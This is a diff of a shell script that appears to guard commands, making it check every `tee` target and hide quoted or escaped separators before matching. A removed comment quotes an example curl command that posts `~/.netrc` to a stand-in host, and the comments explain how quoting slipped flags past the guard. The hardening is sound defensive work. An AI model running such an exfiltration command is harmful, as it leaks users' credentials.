@@ -99,27 +99,35 @@ strip_inert_heredocs() {
        | grep -qvE '^(cat|tee|cd|mkdir|echo|printf|true|[A-Za-z_][A-Za-z0-9_]*=[^$`]*)([[:space:]]|$)'; then
     printf '%s' "$s"; return
   fi
-  if printf '%s\n' "$rest" | grep -oE '(>>?|tee( +-a)?)[[:space:]]*[^[:space:];&|<]+' | grep -qvE '\.(md|txt|rst|log|csv)$'; then
+  # Every target must be prose: each > or >> target, and every file tee is given
+  # (`tee a.md b.sh` writes both; reading only the first let a script through).
+  if { printf '%s\n' "$rest" | grep -oE '>>?[[:space:]]*[^[:space:];&|<]+' | sed -E 's/^>>?[[:space:]]*//'
+       printf '%s\n' "$rest" | tr '\n' ';' | sed -E 's/\|\||&&/;/g; s/[|;&]/\n/g; s/>>?[[:space:]]*[^[:space:];&|<]+//g' \
+         | sed -E 's/^[[:space:]]+//' | grep -E '^tee([[:space:]]|$)' | tr -s ' \t' '\n' | grep -vxE 'tee|-.*'
+     } | grep -v '^$' | grep -qvE '\.(md|txt|rst|log|csv)$'; then
     printf '%s' "$s"; return
   fi
   printf '%s' "$rest"
 }
 
-# `&` inside quotes or a URL is not a command separator, but the guards' [^|;&]
-# spans stop at it, so `curl 'https://h/?a=1&b=2' -d @~/.netrc` hid its flags.
-# Rewritten to %26 for matching only; a bare & outside quotes still separates.
-neutralize_quoted_amps() {
-  case "$1" in *'&'*) ;; *) printf '%s' "$1"; return ;; esac
+# A quoted or backslash-escaped `&`, `;` or `|` is text, not a separator, but the
+# guards' [^|;&] spans stop at it and hid the flags after it. Rewritten to %26,
+# %3B, %7C for matching only. An unquoted one, URL or not, still separates.
+neutralize_quoted_separators() {
+  case "$1" in *'&'*|*';'*|*'|'*) ;; *) printf '%s' "$1"; return ;; esac
   printf '%s\n' "$1" | awk '
+    function hide(ch) { return ch == "&" ? "%26" : ch == ";" ? "%3B" : ch == "|" ? "%7C" : ch }
     BEGIN { q = "" }
-    { out = ""; url = 0
-      for (i = 1; i <= length($0); i++) {
+    { out = ""; n = length($0)
+      for (i = 1; i <= n; i++) {
         c = substr($0, i, 1)
-        if (q == "" && (c == "\"" || c == "\047")) q = c
-        else if (q != "" && c == q) q = ""
-        if (substr($0, i, 3) == "://") url = 1
-        else if (q == "" && (c == " " || c == "\t")) url = 0
-        if (c == "&" && (q != "" || url)) c = "%26"
+        if (c == "\\" && q != "\047") { out = out c hide(substr($0, i + 1, 1)); i++; continue }
+        if (q == "") {
+          if (c == "\047") q = (i > 1 && substr($0, i - 1, 1) == "$") ? "A" : "\047"
+          else if (c == "\"") q = "\""
+        } else if (c == "\047" && (q == "\047" || q == "A")) q = ""
+        else if (c == "\"" && q == "\"") q = ""
+        else c = hide(c)
         out = out c
       }
       print out }'
